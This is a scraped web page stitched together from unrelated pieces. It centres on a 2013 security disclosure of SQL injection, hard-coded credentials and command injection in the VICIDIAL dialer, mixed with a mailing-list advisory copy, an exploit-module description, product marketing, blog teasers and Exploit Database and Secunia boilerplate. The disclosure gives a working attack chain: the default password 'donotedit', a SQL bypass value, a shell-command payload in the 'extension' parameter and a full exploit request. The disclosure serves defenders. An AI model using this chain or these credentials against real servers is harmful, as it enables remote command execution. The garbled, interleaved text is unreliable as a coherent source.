In case there isn't any valid session, the user can provide astGUIcient credentials in order to create one. The results of the injected commands are returned as part of the response from the web server. Affected versions include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well.

*Update:* The VICIDIAL team has publicly released a new version that, according to them, has corrected the issues I’ve pointed out here. Please make sure you are using the latest version available. If you aren’t sure if your instance is safe, contact your friendly local penetration tester to verify it’s secure as you expect it to be.

*Update:* The SQL Injection vulnerability has been assigned CVE-2013-4467, and Command Injection assigned CVE-2013-4468.

## Background [#](#background)

[VICIDIAL](https://www.vicidial.org/vicidial.php) (a.k.a. Asterisk GUI client) is an open-source dialer built on top of the Asterisk PBX. It’s written in PHP, and has a significant number of security issues.

In addition to the open-source project, the company behind VICIDIAL, [The Vicidial Group](https://www.vicidial.com/), also offers VICIDIAL in a hosted environment.

At this time, the current release version **is still vulnerable**. Vendor reports hosted users are on a fixed version. Vendor proposed to release the OSS code in mid-July, as of October 23rd, no update or advisory has been released.

After discussions with other researchers, I have made the decision that after waiting more than 140 days for a release, patches, or an advisory warning users, that the next responsible step is to disclose the issue publicly.

This is not a decision I take lightly, but I believe at this point users of this application should understand the degree of risk involved, and have details so they can take action to minimize that risk.

## Overview [#](#overview)

Tested versions: 2.7RC1, 2.7, 2.8-403a; it is likely other versions are affected.

There are three vulnerabilities that I will discuss here:

1. Pre-Auth SQL Injection in `./apc/SCRIPT_multirecording_AJAX.php`
2. Hard-Coded User Credentials
3. Command Injection in `./agc/manager_send.php`

There are pre and/or post authentication SQL injection flaws in nearly every file in the `./agc` directory. The web portion is split between `./agc` (which is the ‘agent’ interface) and `./vicidial` (the administrative interface). My review did not include the `./vicidial` directory, though a quick glance indicates that there are likely many issues there as well.

There are many other issues; from XSS to a possible DoS by allowing an attacker to write directly to a log file until the attacker has exhausted the free space on the server.

There’s also `./vicidial_mysql_errors.txt` – it might be of interest as it contains query parameters.

I will not document all of the issues that I’ve found; partly because I don’t want to take the time, and also because I feel bad for the team at OSVDB – hundreds of entries for the same application wouldn’t be fun.

## Pre-Auth SQL Injection [#](#pre-auth-sql-injection)

This is your typical, boring, SQL injection:

```
<?php
...
$stmt="select campaign_rec_filename from vicidial_campaigns where campaign_id='$campaign'";

```

The `$campaign` variable is unsanitized and passed directly to the query. This isn’t the best SQL Injection ever, but it demonstrates the issue.

## Hard-Coded User Credentials [#](#hard-coded-user-credentials)

There are two accounts that are created when you install VICIDIAL that have hard-coded passwords, that are used by the software. While these accounts have minimal permissions, they do allow an attacker to get to portions of the code not accessible without a valid user account.

Accounts:

* VDAD
* VDCL

Both accounts have the same password: `donotedit`.

## Command Injection [#](#command-injection)

In multiple locations, there are calls to `passthru()` that do not perform any filtering or sanitation on the input. In this case, we are looking at `./agc/manager_send.php` line 429.

Here is the code in question:

```
<?php
...
if ($ACTION=="OriginateVDRelogin")
    {
    if ( ($enable_sipsak_messages > 0) and ($allow_sipsak_messages > 0) and (preg_match("/SIP/i",$protocol)) )
        {
        $CIDdate = date("ymdHis");
        $DS='-';
        $SIPSAK_prefix = 'LIN-';
        print "<!-- sending login sipsak message: $SIPSAK_prefix$VD_campaign -->\n";
        passthru("/usr/local/bin/sipsak -M -O desktop -B \"$SIPSAK_prefix$campaign\" -r 5060 -s sip:$extension@$phone_ip > /dev/null");
        $queryCID = "$SIPSAK_prefix$campaign$DS$CIDdate";
        }
    $ACTION="Originate";
    }

```

To exploit this, the following values must be set:

* `enable_sipsak_messages=1`
* `allow_sipsak_messages=1`
* `protocol=sip`
* `ACTION=OriginateVDRelogin`
* `session_name=AAAAAAAAAAAA` (or any other value at least 12 bytes long)
* `server_ip=' OR '1' = '1`
* `user=VDCL`
* `pass=donotedit`

The payload is passed in the `extension` parameter, for my testing, I used the following:

`extension=;id;uname -a;`

As you’ve probably noticed, the value for `server_ip` isn’t just a dummy value, it’s taking advantage of a SQL Injection vulnerability on line 285:

```
<?php
...
$stmt="SELECT count(*) from web_client_sessions where session_name='$session_name' and server_ip='$server_ip';";

```

This allows us to bypass the check for an active session, and we use the hard-coded credentials to get around the need for authentication.

When you execute this, it looks like this:

```
GET http://192.168.10.131/agc/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3Bid%3Buname%20-a%3B&user=VDCL&pass=donotedit HTTP/1.1

ERROR Exten  is not valid or queryCID LIN--130602192238 is not valid, Originate command not inserted

```

As you can see, when you run this, the returned text from the shell is included in the middle of the body in the server’s response.

## Timeline & Vendor Response [#](#timeline--vendor-response)

The vendor quickly acknowledged the issues and promised quick fixes. As time has gone on, their hosted users received the security fixes, users of the open-source version remain unaware of the issue and unprotected.

* 6/3/2013 – Vendor notified
* 6/3/2013 – Vendor confirmed
* 6/13/2013 – Vendor states first phase of changes complete; began rolling out fixes to hosted users.
* 6/15/2013 – Requested release timeline.
* 6/15/2013 – Vendor requests disclosure delay till mid-July 2013.
* 7/3/2013 – Vendor advises second phase of changes complete and being pushed to hosted users.
* 8/26/2013 – Requested status update.
* 8/27/2013 – Vendor advises final phase of changes complete, hosted users update with all security changes. Expects to release OSS code in two weeks.
* 9/20/2013 – Requested status update.
* 9/25/2013 – Vendor advises of unrelated delay. Expected to complete work for next release by 9/30.
* 10/23/2013 – Decision made that further delays not in the public interest.

  Earlier this year, a vulnerability was discovered in the Jackson data-binding library, a library for Java that allows developers to easily serialize Java objects to JSON and vice versa, that allowed an attacker to exploit deserialization to achieve Remote Code Execution on the server. This vulnerability didn’t seem to get much attention, and even less documentation. Given that this is an easily exploited Remote Code Execution vulnerability with little documentation, I’m sharing my notes on it.
* ### [PL/SQL Developer: HTTP to Command Execution](https://adamcaudill.com/2016/05/01/plsql-developer-http-to-command-execution/ "PL/SQL Developer: HTTP to Command Execution")

  While looking into PL/SQL Developer – a very popular tool for working with Oracle databases, to see how it encrypts passwords I noticed something interesting. When testing Windows applications, I make it a habit to have Fiddler running, to see if there is any interesting traffic – and in this case, there certainly was.
  PL/SQL Developer has an update mechanism which retrieves a file containing information about available updates to PL/SQL Developer and other components; this file is retrieved via HTTP, meaning that an attacker in a privileged network position could modify this file.
* ### [PL/SQL Developer: Nonexistent Encryption](https://adamcaudill.com/2016/02/02/plsql-developer-nonexistent-encryption/ "PL/SQL Developer: Nonexistent Encryption")

  (See here for another issue discovered during this research; Updates over HTTP & Command Execution.)
  PL/SQL Developer by Allround Automations has an option to store the user’s logon history with passwords – the passwords are encrypted with a proprietary algorithm. At this point, you should know how this is going to go.
  For those that don’t know, PL/SQL Developer is a tool for developers and database administrators to access Oracle – an essential tool in many enterprise environments.
* ### [Dovestones Software AD Self Password Reset (CVE-2015-8267)](https://adamcaudill.com/2015/12/18/dovestones-software-ad-self-password-reset-cve-2015-8267/ "Dovestones Software AD Self Password Reset (CVE-2015-8267)")

  Software AD Self Password Reset v3.0 by Dovestones Software contains a critical vulnerability in the password change functionality, that allows unauthenticated users to change the password of arbitrary accounts.
  The vendor has been working with customers to upgrade them to a fixed version.
  The /Reset/ChangePass function doesn’t validate that the validation questions have been answered, or validate that the account in question is enrolled. This allows an attacker to reset any account that the service account is able to reset, even if they aren’t enrolled.
* ### [phpMyID: Fixing Abandoned OSS Software](https://adamcaudill.com/2014/04/19/phpmyid-fixing-abandoned-oss-software/ "phpMyID: Fixing Abandoned OSS Software")

  phpMyID is a simple solution for those that want to run their own OpenID endpoint – the problem is that its author stopped maintaining the project in 2008. Despite this, there’s still quite a few people that use it, because it’s the easiest single-user OpenID option available.
  Unfortunately, the author didn’t follow best practices when building the software, and as a result multiple security flaws were introduced. In 2008, a XSS was identified and never fixed (CVE-2008-4730), in the years since then it seems the software has been below the radar.

The agent interface is an interactive set of web pages that work through a web browser to give real-time information and functionality with nothing more than an internet browser on the client computer.  The management interface is also web-based and offers the ability to view many real-time and summary reports as well as many detailed campaign and agent options and settings.  VICIDIAL can function as an ACD for inbound calls or for Closer calls coming from VICIDIAL outbound fronters and even allows for remote agents logging in from remote locations as well as remote agents that may only have a phone.  There are currently over 24,000 installations of VICIDIAL in production in over 100 countries around the world, several with over 300 agent seats and many with multiple locations.  The software suite also includes a from-scratch software installation document, full English and Spanish versions of the web-clients and admin pages(and functional versions of several other languages), and is designed to work with an Asterisk system that has Zap/DAHDI(T1/E1/PSTN) telco lines or VOIP(IAX or SIP) trunks and many different kinds of softphones and hardphones. This group of applications is designed to run on top of almost any version of Asterisk so no messing around with the Asterisk source code is necessary. For more information see the system requirements at the bottom of the page.  **MAJOR VICIDIAL FEATURES:**  * Inbound, Outbound and Blended call handling and Inbound Email handling* Outbound

# VICIDIAL 2.7 - SQL Injection, Command Injection

---

*From*: Adam Caudill <adam () adamcaudill com>

*Date*: Wed, 23 Oct 2013 02:52:06 -0400

---

```

Requestor: Adam Caudill, adam () adamcaudill com
Software: VICIDIAL (<http://www.vicidial.org/vicidial.php>)
Vendor: The Vicidial Group (<http://www.vicidial.com/>)
Vulnerability Type: Authenticated SQL Injection, Authenticated Command Injection

Source Code: <http://sourceforge.net/projects/astguiclient/files/astguiclient_2.7rc1.zip/download>
 Flaws exist in /www/agc/manager_send.php
 SQL Injection: Line 285
 Command Injection: Line 429

Affected Versions: 2.7RC1, 2.7, 2.8-403a (others likely)

Current released version is vulnerable; vendor confirmed issue on 6/3, set timeline for mid-July release, has delayed
continually. Vendor has deployed fixes to users of their hosted service, still no updates or advisory for OSS users.

Affected lines of code:

manager_send.php:285
  $stmt="SELECT count(*) from web_client_sessions where session_name='$session_name' and server_ip='$server_ip';";

manager_send.php:429
  passthru("/usr/local/bin/sipsak -M -O desktop -B \"$SIPSAK_prefix$campaign\" -r 5060 -s sip:$extension@$phone_ip >
/dev/null");

In both of these cases, parameters are passed through without validation or escaping.

During setup, two accounts with hard-coded passwords are created (VDAD, VDCL), these can be used to bypass the
authentication check, allowing access to where the SQL Injection vulnerability is, which can be used to bypass an
additional check, thus giving access to the Command Injection vulnerability. The output from shell commands are
returned in the server response.

There are MANY other issues of various types in this software, but I am not documenting them.

Security vulns rarely come alone or just in pairs, usually they travel
in packs :P.

      'Name'        => 'VICIdial Manager Send OS Command Injection',
      'Description' => %q{
          The file agc/manager_send.php in the VICIdial web application uses
        unsanitized user input as part of a command that is executed using the PHP
        passthru() function. A valid username, password and session are needed to access
        the injection point. Fortunately, VICIdial has two built-in accounts with default
        passwords and the manager_send.php file has a SQL injection vulnerability that can
        be used to bypass the session check as long as at least one session has been
        created at some point in time. In case there isn't any valid session, the user can
        provide astGUIcient credentials in order to create one. The results of the injected
        command are returned as part of the response from the web server. Affected versions
        include 2.7RC1, 2.7, and 2.8-403a. Other versions are likely affected as well. The
        default credentials used by Vicidial are VDCL/donotedit and VDAD/donotedit.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
